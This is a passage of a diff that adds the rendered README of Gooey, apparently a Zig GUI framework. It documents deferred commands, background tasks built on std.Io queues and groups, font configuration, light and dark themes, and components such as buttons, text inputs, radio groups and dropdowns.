+<span>fn</span> <span>openFolderDeferred</span>(<span>self</span>: <span>*</span><span>State</span>, <span>g</span>: <span>*</span><span>Gooey</span>) <span>void</span> {
+    <span>_</span> <span>=</span> <span>g</span>;
+    <span>// Safe to open modal dialog here - we&#39;re outside event handling</span>
+    <span>const</span> <span>file_dialog</span> <span>=</span> <span>gooey</span>.<span>file_dialog</span>;
+    <span>if</span> (<span>file_dialog</span>.<span>promptForPaths</span>(<span>allocator</span>, .{ .<span>directories</span> <span>=</span> <span>true</span> })) <span>|</span><span>result</span><span>|</span> {
+        <span>defer</span> <span>result</span>.<span>deinit</span>();
+        <span>const</span> <span>path</span> <span>=</span> <span>result</span>.<span>paths</span>[<span>0</span>];
+        <span>self</span>.<span>loadDirectory</span>(<span>path</span>);
+    }
+}
+
+<span>// With an argument (same 8-byte limit applies):</span>
+<span>pub</span> <span>fn</span> <span>deleteItem</span>(<span>self</span>: <span>*</span><span>State</span>, <span>g</span>: <span>*</span><span>Gooey</span>, <span>index</span>: <span>u32</span>) <span>void</span> {
+    <span>_</span> <span>=</span> <span>self</span>;
+    <span>g</span>.<span>deferCommandWith</span>(<span>State</span>, <span>u32</span>, <span>index</span>, <span>State</span>.<span>confirmDelete</span>);
+}
+
+<span>fn</span> <span>confirmDelete</span>(<span>self</span>: <span>*</span><span>State</span>, <span>g</span>: <span>*</span><span>Gooey</span>, <span>index</span>: <span>u32</span>) <span>void</span> {
+    <span>_</span> <span>=</span> <span>g</span>;
+    <span>if</span> (<span>dialog</span>.<span>confirm</span>(<span>&#34;Delete item?&#34;</span>)) {
+        <span>self</span>.<span>items</span>.<span>remove</span>(<span>index</span>);
+    }
+}</pre></div>
+<p dir="auto">The deferred command queue holds up to 32 commands and is flushed after each event cycle.</p>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Background Work (<code>Io.Queue</code> / <code>Io.Group</code>)</h3><a aria-label="Permalink: Background Work (Io.Queue / Io.Group)" href="#background-work-ioqueue--iogroup" id="user-content-background-work-ioqueue--iogroup"></a></p>
+<p dir="auto">Run expensive work — network requests, file I/O, heavy computation — off the UI thread using Zig 0.16&#39;s <code>std.Io</code>. The framework owns no executor of its own: background tasks are spawned with <code>cx.io().async(...)</code>, hand their results back through a bounded <code>std.Io.Queue(T)</code>, and the render loop drains that queue each frame. Background tasks <strong>never touch UI state directly</strong> — they only push typed results — so there are no locks on your state.</p>
+<p dir="auto">This is the same pattern <code>src/image/loader.zig</code> uses for async image URL fetches.</p>
+<div dir="auto" data-snippet-clipboard-copy-content="// A typed result the background task hands back to the render loop.
+const Fetch = union(enum) {
+    ok: []const u8,
+    failed,
+};
+
+const State = struct {
+    // Fixed-capacity, statically-backed channel — no allocation after init.
+    result_buffer: [16]Fetch = undefined,
+    result_queue: std.Io.Queue(Fetch) = undefined,
+
+    // Owns the in-flight task(s) so they can be cancelled together.
+    fetch_group: std.Io.Group = .init,
+
+    response: []const u8 = &#34;&#34;,
+
+    // Kick off background work from a handler — runs off the UI thread.
+    pub fn startFetch(self: *State, cx: *Cx) void {
+        const url = &#34;https://api.example.com/data&#34;;
+        self.result_queue = .init(&amp;self.result_buffer);
+
+        // \`io\` is passed twice: once to drive \`async\`, and again inside the
+        // args tuple so the task body can push into the queue.
+        self.fetch_group.async(cx.io(), fetchData, .{ cx.io(), url, &amp;self.result_queue });
+
+        // Auto-cancel on window close so a late task can&#39;t write into freed state.
+        cx.registerCancelGroup(&amp;self.fetch_group);
+    }
+};
+
+// Background task — never touches UI state, only pushes a typed result.
+fn fetchData(io: std.Io, url: []const u8, queue: *std.Io.Queue(Fetch)) void {
+    const body = httpGet(io, url) catch {
+        queue.putOneUncancelable(io, .failed) catch {};
+        return;
+    };
+    queue.putOneUncancelable(io, .{ .ok = body }) catch {};
+}
+
+fn render(cx: *Cx) void {
+    const s = cx.state(State);
+
+    // Non-blocking drain — safe to call every frame from \`render\`.
+    var buffer: [16]Fetch = undefined;
+    for (cx.drainQueue(Fetch, &amp;s.result_queue, &amp;buffer)) |result| switch (result) {
+        .ok =&gt; |body| s.response = body,
+        .failed =&gt; {},
+    }
+
+    // ... build UI from s.response ...
+}"><pre><span>// A typed result the background task hands back to the render loop.</span>
+<span>const</span> <span>Fetch</span> <span>=</span> <span>union</span>(<span>enum</span>) {
+    <span>ok</span>: []<span>const</span> <span>u8</span>,
+    <span>failed</span>,
+};
+
+<span>const</span> <span>State</span> <span>=</span> <span>struct</span> {
+    <span>// Fixed-capacity, statically-backed channel — no allocation after init.</span>
+    <span>result_buffer</span>: [<span>16</span>]<span>Fetch</span> <span>=</span> <span>undefined</span>,
+    <span>result_queue</span>: <span>std</span>.<span>Io</span>.<span>Queue</span>(<span>Fetch</span>) <span>=</span> <span>undefined</span>,
+
+    <span>// Owns the in-flight task(s) so they can be cancelled together.</span>
+    <span>fetch_group</span>: <span>std.Io.Group</span> <span>=</span> <span>.init</span>,
+
+    <span>response</span>: []<span>const</span> <span>u8</span> <span>=</span> <span>&#34;&#34;</span>,
+
+    <span>// Kick off background work from a handler — runs off the UI thread.</span>
+    <span>pub</span> <span>fn</span> <span>startFetch</span>(<span>self</span>: <span>*</span><span>State</span>, <span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+        <span>const</span> <span>url</span> <span>=</span> <span>&#34;https://api.example.com/data&#34;</span>;
+        <span>self</span>.<span>result_queue</span> <span>=</span> .<span>init</span>(<span>&amp;</span><span>self</span>.<span>result_buffer</span>);
+
+        <span>// \`io\` is passed twice: once to drive \`async\`, and again inside the</span>
+        <span>// args tuple so the task body can push into the queue.</span>
+        <span>self</span>.<span>fetch_group</span>.<span>async</span>(<span>cx</span>.<span>io</span>(), <span>fetchData</span>, .{ <span>cx</span>.<span>io</span>(), <span>url</span>, <span>&amp;</span><span>self</span>.<span>result_queue</span> });
+
+        <span>// Auto-cancel on window close so a late task can&#39;t write into freed state.</span>
+        <span>cx</span>.<span>registerCancelGroup</span>(<span>&amp;</span><span>self</span>.<span>fetch_group</span>);
+    }
+};
+
+<span>// Background task — never touches UI state, only pushes a typed result.</span>
+<span>fn</span> <span>fetchData</span>(<span>io</span>: <span>std.Io</span>, <span>url</span>: []<span>const</span> <span>u8</span>, <span>queue</span>: <span>*</span><span>std</span>.<span>Io</span>.<span>Queue</span>(<span>Fetch</span>)) <span>void</span> {
+    <span>const</span> <span>body</span> <span>=</span> <span>httpGet</span>(<span>io</span>, <span>url</span>) <span>catch</span> {
+        <span>queue</span>.<span>putOneUncancelable</span>(<span>io</span>, <span>.failed</span>) <span>catch</span> {};
+        <span>return</span>;
+    };
+    <span>queue</span>.<span>putOneUncancelable</span>(<span>io</span>, .{ .<span>ok</span> <span>=</span> <span>body</span> }) <span>catch</span> {};
+}
+
+<span>fn</span> <span>render</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>state</span>(<span>State</span>);
+
+    <span>// Non-blocking drain — safe to call every frame from \`render\`.</span>
+    <span>var</span> <span>buffer</span>: [<span>16</span>]<span>Fetch</span> <span>=</span> <span>undefined</span>;
+    <span>for</span> (<span>cx</span>.<span>drainQueue</span>(<span>Fetch</span>, <span>&amp;</span><span>s</span>.<span>result_queue</span>, <span>&amp;</span><span>buffer</span>)) <span>|</span><span>result</span><span>|</span> <span>switch</span> (<span>result</span>) {
+        <span>.ok</span> <span>=</span><span>&gt;</span> <span>|</span><span>body</span><span>|</span> <span>s</span>.<span>response</span> <span>=</span> <span>body</span>,
+        <span>.failed</span> <span>=</span><span>&gt;</span> {},
+    }
+
+    <span>// ... build UI from s.response ...</span>
+}</pre></div>
+<p dir="auto"><strong>Key pieces:</strong></p>
+<ul dir="auto">
+<li><strong><code>cx.io()</code></strong> — the <code>std.Io</code> instance threaded through the framework from <code>main()</code>. Pass it to <code>async</code>, queue, and timing calls.</li>
+<li><strong><code>cx.io().async(fn, .{args})</code></strong> (or <strong><code>group.async(io, fn, .{args})</code></strong>) — spawn background work. Pass <code>io</code> inside the args tuple too if the task needs to push into a queue.</li>
+<li><strong><code>std.Io.Queue(T)</code></strong> — bounded, lock-free, statically-backed channel. Tasks push with <code>putOneUncancelable(io, value)</code>; capacity is fixed at init (no allocation afterward).</li>
+<li><strong><code>cx.drainQueue(T, &amp;queue, &amp;buffer)</code></strong> — non-blocking drain into your buffer; returns an empty slice when nothing is ready, so it&#39;s safe to call every frame.</li>
+<li><strong><code>std.Io.Group</code></strong> — owns one or more in-flight tasks so they can be cancelled together.</li>
+<li><strong><code>cx.registerCancelGroup(&amp;group)</code></strong> — auto-cancel a group on window close (pair with <code>cx.unregisterCancelGroup</code> if the work finishes normally). For per-entity lifecycles, use <code>cx.entities.attachCancel(id, &amp;group)</code> to cancel when the entity is removed.</li>
+</ul>
+<blockquote>
+<p dir="auto"><strong>Note:</strong> This rides on Zig 0.16&#39;s <code>std.Io</code>, so the threaded backend is unavailable on WASM (single-threaded) — see <a href="#wasm">WASM</a>. The earlier <code>cx.dispatchBackground</code> / <code>dispatchOnMainThread</code> / <code>dispatchAfter</code> APIs were removed in the <code>std.Io</code> migration; the <code>Io.Queue</code> + <code>Io.Group</code> pattern above replaces them. See <a href="https://github.com/duanebester/gooey/blob/main/docs/zig-0.16-io-migration.md"><code>docs/zig-0.16-io-migration.md</code></a>.</p>
+</blockquote>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Fonts</h2><a aria-label="Permalink: Fonts" href="#fonts" id="user-content-fonts"></a></p>
+<p dir="auto">By default, Gooey uses the platform&#39;s system sans-serif font (e.g., DejaVu Sans on Linux, SF Pro on macOS, system-ui on web). You can set a custom font at app init or switch fonts at runtime.</p>
+<p dir="auto"><h3 tabindex="-1" dir="auto">App-Level Font</h3><a aria-label="Permalink: App-Level Font" href="#app-level-font" id="user-content-app-level-font"></a></p>
+<p dir="auto">Set <code>.font</code> in your app config to use any font installed on the system:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const App = gooey.App(AppState, &amp;state, render, .{
+    .title = &#34;My App&#34;,
+    .font = &#34;Inter&#34;,
+    .font_size = 16.0,   // optional, defaults to 16.0
+});"><pre><span>const</span> <span>App</span> <span>=</span> <span>gooey</span>.<span>App</span>(<span>AppState</span>, <span>&amp;</span><span>state</span>, <span>render</span>, .{
+    .<span>title</span> <span>=</span> <span>&#34;My App&#34;</span>,
+    .<span>font</span> <span>=</span> <span>&#34;Inter&#34;</span>,
+    .<span>font_size</span> <span>=</span> <span>16.0</span>,   <span>// optional, defaults to 16.0</span>
+});</pre></div>
+<p dir="auto">Omitting <code>.font</code> uses the platform default. On Linux, any font discoverable by Fontconfig works — install fonts via your package manager (e.g., <code>sudo apt install fonts-inter</code>) or drop <code>.ttf</code>/<code>.otf</code> files into <code>~/.local/share/fonts/</code>.</p>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Runtime Font Switching</h3><a aria-label="Permalink: Runtime Font Switching" href="#runtime-font-switching" id="user-content-runtime-font-switching"></a></p>
+<p dir="auto">Change the font on the fly from any event handler:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="fn onSettingsChanged(cx: *Cx) void {
+    const s = cx.state(AppState);
+    cx.setFont(s.font_name, s.font_size) catch {};
+}"><pre><span>fn</span> <span>onSettingsChanged</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>const</span> <span>s</span> <span>=</span> <span>cx</span>.<span>state</span>(<span>AppState</span>);
+    <span>cx</span>.<span>setFont</span>(<span>s</span>.<span>font_name</span>, <span>s</span>.<span>font_size</span>) <span>catch</span> {};
+}</pre></div>
+<p dir="auto">This clears the glyph and shape caches and triggers a re-render automatically. All text in the UI updates immediately.</p>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Platform Details</h3><a aria-label="Permalink: Platform Details" href="#platform-details" id="user-content-platform-details"></a></p>
+<markdown-accessiblity-table><table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Font Discovery</th>
+<th>System Sans-Serif</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Linux</td>
+<td>Fontconfig</td>
+<td><code>sans-serif</code> (typically DejaVu Sans or Noto Sans)</td>
+</tr>
+<tr>
+<td>macOS</td>
+<td>CoreText</td>
+<td>SF Pro</td>
+</tr>
+<tr>
+<td>Web</td>
+<td>CSS font stack</td>
+<td><code>system-ui, -apple-system, sans-serif</code></td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<blockquote>
+<p dir="auto"><strong>Note:</strong> Gooey currently uses a single global font. Per-component font families (e.g., mixing a serif body font with a monospace code font) are not yet supported — components expose <code>font_size</code> but not <code>font_family</code>.</p>
+</blockquote>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Theming</h2><a aria-label="Permalink: Theming" href="#theming" id="user-content-theming"></a></p>
+<p dir="auto">Gooey ships with two built-in themes — <code>Theme.light</code> (Catppuccin Latte) and <code>Theme.dark</code> (Catppuccin Macchiato). Set the active theme before rendering:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="fn render(cx: *Cx) void {
+    cx.setTheme(if (s.dark_mode) &amp;Theme.dark else &amp;Theme.light);
+    // ...
+}"><pre><span>fn</span> <span>render</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>cx</span>.<span>setTheme</span>(<span>if</span> (<span>s</span>.<span>dark_mode</span>) <span>&amp;</span><span>Theme</span>.<span>dark</span> <span>else</span> <span>&amp;</span><span>Theme</span>.<span>light</span>);
+    <span>// ...</span>
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Custom Themes</h3><a aria-label="Permalink: Custom Themes" href="#custom-themes" id="user-content-custom-themes"></a></p>
+<p dir="auto">Define a light/dark pair of <code>Theme</code> values and swap between them the same way as the built-ins. Every field has a semantic role so components resolve colors automatically without per-component overrides:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const my_light = gooey.Theme{
+    .bg      = Color.rgb(0.97, 0.97, 0.98),
+    .surface = Color.rgb(0.93, 0.93, 0.95),
+    .overlay = Color.rgb(0.88, 0.88, 0.91),
+
+    .primary   = Color.rgb(0.20, 0.50, 0.90),
+    .secondary = Color.rgb(0.45, 0.48, 0.58),
+    .accent    = Color.rgb(0.55, 0.25, 0.85),
+    .success   = Color.rgb(0.20, 0.65, 0.30),
+    .warning   = Color.rgb(0.85, 0.60, 0.10),
+    .danger    = Color.rgb(0.82, 0.24, 0.24),
+
+    .text    = Color.rgb(0.15, 0.15, 0.20),
+    .subtext = Color.rgb(0.35, 0.37, 0.45),
+    .muted   = Color.rgb(0.55, 0.57, 0.65),
+
+    .border       = Color.rgba(0.55, 0.57, 0.65, 0.3),
+    .border_focus = Color.rgb(0.20, 0.50, 0.90),
+
+    .radius_sm = 4,
+    .radius_md = 8,
+    .radius_lg = 16,
+
+    .font_size_base = 14,
+};
+
+const my_dark = gooey.Theme{
+    .bg      = Color.rgb(0.10, 0.10, 0.12),
+    .surface = Color.rgb(0.15, 0.15, 0.18),
+    .overlay = Color.rgb(0.20, 0.20, 0.24),
+
+    .primary   = Color.rgb(0.40, 0.70, 1.00),
+    .secondary = Color.rgb(0.45, 0.48, 0.58),
+    .accent    = Color.rgb(0.75, 0.55, 0.95),
+    .success   = Color.rgb(0.45, 0.85, 0.55),
+    .warning   = Color.rgb(0.95, 0.80, 0.35),
+    .danger    = Color.rgb(0.95, 0.40, 0.40),
+
+    .text    = Color.rgb(0.92, 0.92, 0.95),
+    .subtext = Color.rgb(0.70, 0.72, 0.80),
+    .muted   = Color.rgb(0.50, 0.52, 0.60),
+
+    .border       = Color.rgba(0.50, 0.52, 0.60, 0.3),
+    .border_focus = Color.rgb(0.40, 0.70, 1.00),
+
+    .radius_sm = 4,
+    .radius_md = 8,
+    .radius_lg = 16,
+
+    .font_size_base = 14,
+};
+
+fn render(cx: *Cx) void {
+    cx.setTheme(if (s.dark_mode) &amp;my_dark else &amp;my_light);
+    // ...
+}"><pre><span>const</span> <span>my_light</span> <span>=</span> <span>gooey.Theme</span>{
+    .<span>bg</span>      <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.97</span>, <span>0.97</span>, <span>0.98</span>),
+    .<span>surface</span> <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.93</span>, <span>0.93</span>, <span>0.95</span>),
+    .<span>overlay</span> <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.88</span>, <span>0.88</span>, <span>0.91</span>),
+
+    .<span>primary</span>   <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.20</span>, <span>0.50</span>, <span>0.90</span>),
+    .<span>secondary</span> <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.45</span>, <span>0.48</span>, <span>0.58</span>),
+    .<span>accent</span>    <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.55</span>, <span>0.25</span>, <span>0.85</span>),
+    .<span>success</span>   <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.20</span>, <span>0.65</span>, <span>0.30</span>),
+    .<span>warning</span>   <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.85</span>, <span>0.60</span>, <span>0.10</span>),
+    .<span>danger</span>    <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.82</span>, <span>0.24</span>, <span>0.24</span>),
+
+    .<span>text</span>    <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.15</span>, <span>0.15</span>, <span>0.20</span>),
+    .<span>subtext</span> <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.35</span>, <span>0.37</span>, <span>0.45</span>),
+    .<span>muted</span>   <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.55</span>, <span>0.57</span>, <span>0.65</span>),
+
+    .<span>border</span>       <span>=</span> <span>Color</span>.<span>rgba</span>(<span>0.55</span>, <span>0.57</span>, <span>0.65</span>, <span>0.3</span>),
+    .<span>border_focus</span> <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.20</span>, <span>0.50</span>, <span>0.90</span>),
+
+    .<span>radius_sm</span> <span>=</span> <span>4</span>,
+    .<span>radius_md</span> <span>=</span> <span>8</span>,
+    .<span>radius_lg</span> <span>=</span> <span>16</span>,
+
+    .<span>font_size_base</span> <span>=</span> <span>14</span>,
+};
+
+<span>const</span> <span>my_dark</span> <span>=</span> <span>gooey.Theme</span>{
+    .<span>bg</span>      <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.10</span>, <span>0.10</span>, <span>0.12</span>),
+    .<span>surface</span> <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.15</span>, <span>0.15</span>, <span>0.18</span>),
+    .<span>overlay</span> <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.20</span>, <span>0.20</span>, <span>0.24</span>),
+
+    .<span>primary</span>   <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.40</span>, <span>0.70</span>, <span>1.00</span>),
+    .<span>secondary</span> <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.45</span>, <span>0.48</span>, <span>0.58</span>),
+    .<span>accent</span>    <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.75</span>, <span>0.55</span>, <span>0.95</span>),
+    .<span>success</span>   <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.45</span>, <span>0.85</span>, <span>0.55</span>),
+    .<span>warning</span>   <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.95</span>, <span>0.80</span>, <span>0.35</span>),
+    .<span>danger</span>    <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.95</span>, <span>0.40</span>, <span>0.40</span>),
+
+    .<span>text</span>    <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.92</span>, <span>0.92</span>, <span>0.95</span>),
+    .<span>subtext</span> <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.70</span>, <span>0.72</span>, <span>0.80</span>),
+    .<span>muted</span>   <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.50</span>, <span>0.52</span>, <span>0.60</span>),
+
+    .<span>border</span>       <span>=</span> <span>Color</span>.<span>rgba</span>(<span>0.50</span>, <span>0.52</span>, <span>0.60</span>, <span>0.3</span>),
+    .<span>border_focus</span> <span>=</span> <span>Color</span>.<span>rgb</span>(<span>0.40</span>, <span>0.70</span>, <span>1.00</span>),
+
+    .<span>radius_sm</span> <span>=</span> <span>4</span>,
+    .<span>radius_md</span> <span>=</span> <span>8</span>,
+    .<span>radius_lg</span> <span>=</span> <span>16</span>,
+
+    .<span>font_size_base</span> <span>=</span> <span>14</span>,
+};
+
+<span>fn</span> <span>render</span>(<span>cx</span>: <span>*</span><span>Cx</span>) <span>void</span> {
+    <span>cx</span>.<span>setTheme</span>(<span>if</span> (<span>s</span>.<span>dark_mode</span>) <span>&amp;</span><span>my_dark</span> <span>else</span> <span>&amp;</span><span>my_light</span>);
+    <span>// ...</span>
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Base Font Size</h3><a aria-label="Permalink: Base Font Size" href="#base-font-size" id="user-content-base-font-size"></a></p>
+<p dir="auto">The <code>font_size_base</code> field (default <code>14</code>) is the single source of truth for text sizing across components. Components scale relative to it — for example, <code>Button</code> derives its per-size font sizes as:</p>
+<markdown-accessiblity-table><table>
+<thead>
+<tr>
+<th>Button size</th>
+<th>Font size</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>.small</code></td>
+<td><code>base - 2</code> (12)</td>
+</tr>
+<tr>
+<td><code>.medium</code></td>
+<td><code>base</code> (14)</td>
+</tr>
+<tr>
+<td><code>.large</code></td>
+<td><code>base + 2</code> (16)</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">Set it once in your theme and every component scales consistently — no per-component font size overrides needed:</p>
+<div dir="auto" data-snippet-clipboard-copy-content="const large_text_theme = gooey.Theme{
+    // ...colors...
+    .font_size_base = 18,  // small=16, medium=18, large=20
+};"><pre><span>const</span> <span>large_text_theme</span> <span>=</span> <span>gooey.Theme</span>{
+    <span>// ...colors...</span>
+    .<span>font_size_base</span> <span>=</span> <span>18</span>,  <span>// small=16, medium=18, large=20</span>
+};</pre></div>
+<p dir="auto"><h2 tabindex="-1" dir="auto">Components</h2><a aria-label="Permalink: Components" href="#components" id="user-content-components"></a></p>
+<p dir="auto">Gooey includes ready-to-use components:</p>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Button</h3><a aria-label="Permalink: Button" href="#button" id="user-content-button"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Button variants
+Button{ .label = &#34;Save&#34;, .variant = .primary, .on_click_handler = cx.update(State.save) }
+Button{ .label = &#34;Cancel&#34;, .variant = .secondary, .size = .small, .on_click_handler = ... }
+Button{ .label = &#34;Delete&#34;, .variant = .danger, .on_click_handler = ... }"><pre><span>// Button variants</span>
+<span>Button</span>{ .<span>label</span> <span>=</span> <span>&#34;Save&#34;</span>, .<span>variant</span> <span>=</span> <span>.primary</span>, .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>update</span>(<span>State</span>.<span>save</span>) }
+<span>Button</span>{ .<span>label</span> <span>=</span> <span>&#34;Cancel&#34;</span>, .<span>variant</span> <span>=</span> <span>.secondary</span>, .<span>size</span> <span>=</span> <span>.small</span>, .<span>on_click_handler</span> <span>=</span> <span>...</span> }
+<span>Button</span>{ .<span>label</span> <span>=</span> <span>&#34;Delete&#34;</span>, .<span>variant</span> <span>=</span> <span>.danger</span>, .<span>on_click_handler</span> <span>=</span> <span>...</span> }</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">TextInput &amp; TextArea</h3><a aria-label="Permalink: TextInput &amp; TextArea" href="#textinput--textarea" id="user-content-textinput--textarea"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="// Single-line text input with binding
+TextInput{
+    .id = &#34;email&#34;,
+    .placeholder = &#34;Enter email...&#34;,
+    .bind = &amp;s.email,
+    .width = 250,
+}
+
+// Multi-line text area
+TextArea{
+    .id = &#34;notes&#34;,
+    .placeholder = &#34;Enter notes...&#34;,
+    .bind = &amp;s.notes,
+    .width = 400,
+    .height = 200,
+}"><pre><span>// Single-line text input with binding</span>
+<span>TextInput</span>{
+    .<span>id</span> <span>=</span> <span>&#34;email&#34;</span>,
+    .<span>placeholder</span> <span>=</span> <span>&#34;Enter email...&#34;</span>,
+    .<span>bind</span> <span>=</span> <span>&amp;</span><span>s</span>.<span>email</span>,
+    .<span>width</span> <span>=</span> <span>250</span>,
+}
+
+<span>// Multi-line text area</span>
+<span>TextArea</span>{
+    .<span>id</span> <span>=</span> <span>&#34;notes&#34;</span>,
+    .<span>placeholder</span> <span>=</span> <span>&#34;Enter notes...&#34;</span>,
+    .<span>bind</span> <span>=</span> <span>&amp;</span><span>s</span>.<span>notes</span>,
+    .<span>width</span> <span>=</span> <span>400</span>,
+    .<span>height</span> <span>=</span> <span>200</span>,
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Checkbox</h3><a aria-label="Permalink: Checkbox" href="#checkbox" id="user-content-checkbox"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="Checkbox{
+    .id = &#34;terms&#34;,
+    .checked = s.agreed_to_terms,
+    .on_click_handler = cx.update(State.toggleTerms),
+}"><pre><span>Checkbox</span>{
+    .<span>id</span> <span>=</span> <span>&#34;terms&#34;</span>,
+    .<span>checked</span> <span>=</span> <span>s</span>.<span>agreed_to_terms</span>,
+    .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>update</span>(<span>State</span>.<span>toggleTerms</span>),
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">RadioButton &amp; RadioGroup</h3><a aria-label="Permalink: RadioButton &amp; RadioGroup" href="#radiobutton--radiogroup" id="user-content-radiobutton--radiogroup"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="// RadioButton - individual buttons for custom layouts
+RadioButton{
+    .label = &#34;Email&#34;,
+    .is_selected = s.contact_method == 0,
+    .on_click_handler = cx.updateWith(@as(u8, 0), State.setContactMethod),
+}
+
+// RadioGroup - grouped buttons with handlers array
+RadioGroup{
+    .id = &#34;priority&#34;,
+    .options = &amp;.{ &#34;Low&#34;, &#34;Medium&#34;, &#34;High&#34; },
+    .selected = s.priority,
+    .handlers = &amp;.{
+        cx.updateWith(@as(u8, 0), State.setPriority),
+        cx.updateWith(@as(u8, 1), State.setPriority),
+        cx.updateWith(@as(u8, 2), State.setPriority),
+    },
+    .direction = .row,  // or .column
+    .gap = 16,
+}"><pre><span>// RadioButton - individual buttons for custom layouts</span>
+<span>RadioButton</span>{
+    .<span>label</span> <span>=</span> <span>&#34;Email&#34;</span>,
+    .<span>is_selected</span> <span>=</span> <span>s</span>.<span>contact_method</span> <span>==</span> <span>0</span>,
+    .<span>on_click_handler</span> <span>=</span> <span>cx</span>.<span>updateWith</span>(<span>@as</span>(<span>u8</span>, <span>0</span>), <span>State</span>.<span>setContactMethod</span>),
+}
+
+<span>// RadioGroup - grouped buttons with handlers array</span>
+<span>RadioGroup</span>{
+    .<span>id</span> <span>=</span> <span>&#34;priority&#34;</span>,
+    .<span>options</span> <span>=</span> &amp;.{ <span>&#34;Low&#34;</span>, <span>&#34;Medium&#34;</span>, <span>&#34;High&#34;</span> },
+    .<span>selected</span> <span>=</span> <span>s</span>.<span>priority</span>,
+    .<span>handlers</span> <span>=</span> &amp;.{
+        <span>cx</span>.<span>updateWith</span>(<span>@as</span>(<span>u8</span>, <span>0</span>), <span>State</span>.<span>setPriority</span>),
+        <span>cx</span>.<span>updateWith</span>(<span>@as</span>(<span>u8</span>, <span>1</span>), <span>State</span>.<span>setPriority</span>),
+        <span>cx</span>.<span>updateWith</span>(<span>@as</span>(<span>u8</span>, <span>2</span>), <span>State</span>.<span>setPriority</span>),
+    },
+    .<span>direction</span> <span>=</span> <span>.row</span>,  <span>// or .column</span>
+    .<span>gap</span> <span>=</span> <span>16</span>,
+}</pre></div>
+<p dir="auto"><h3 tabindex="-1" dir="auto">Select (Dropdown)</h3><a aria-label="Permalink: Select (Dropdown)" href="#select-dropdown" id="user-content-select-dropdown"></a></p>
+<div dir="auto" data-snippet-clipboard-copy-content="const State = struct {
+    selected_fruit: ?usize = null,
+
+    pub fn selectFruit(self: *State, index: usize) void {
+        self.selected_fruit = index;
+    }
+};
+
+// In render:
+Select{
+    .id = &#34;fruit-select&#34;,
+    .options = &amp;.{ &#34;Apple&#34;, &#34;Banana&#34;, &#34;Cherry&#34;, &#34;Date&#34; },
+    .selected = s.selected_fruit,
+    .placeholder = &#34;Choose a fruit...&#34;,
+    .on_select = cx.onSelect(State.selectFruit),
+    .width = 200,
+}"><pre><span>const</span> <span>State</span> <span>=</span> <span>struct</span> {
+    <span>selected_fruit</span>: <span>?</span><span>usize</span> <span>=</span> <span>null</span>,
+
+    <span>pub</span> <span>fn</span> <span>selectFruit</span>(<span>self</span>: <span>*</span><span>State</span>, <span>index</span>: <span>usize</span>) <span>void</span> {
+        <span>self</span>.<span>selected_fruit</span> <span>=</span> <span>index</span>;
+    }
+};
+
+<span>// In render:</span>
+<span>Select</span>{
+    .<span>id</span> <span>=</span> <span>&#34;fruit-select&#34;</span>,
+    .<span>options</span> <span>=</span> &amp;.{ <span>&#34;Apple&#34;</span>, <span>&#34;Banana&#34;</span>, <span>&#34;Cherry&#34;</span>, <span>&#34;Date&#34;</span> },
+    .<span>selected</span> <span>=</span> <span>s</span>.<span>selected_fruit</span>,
+    .<span>placeholder</span> <span>=</span> <span>&#34;Choose a fruit...&#34;</span>,
+    .<span>on_select</span> <span>=</span> <span>cx</span>.<span>onSelect</span>(<span>State</span>.<span>selectFruit</span>),
+    .<span>width</span> <span>=</span> <span>200</span>,
+}</pre></div>
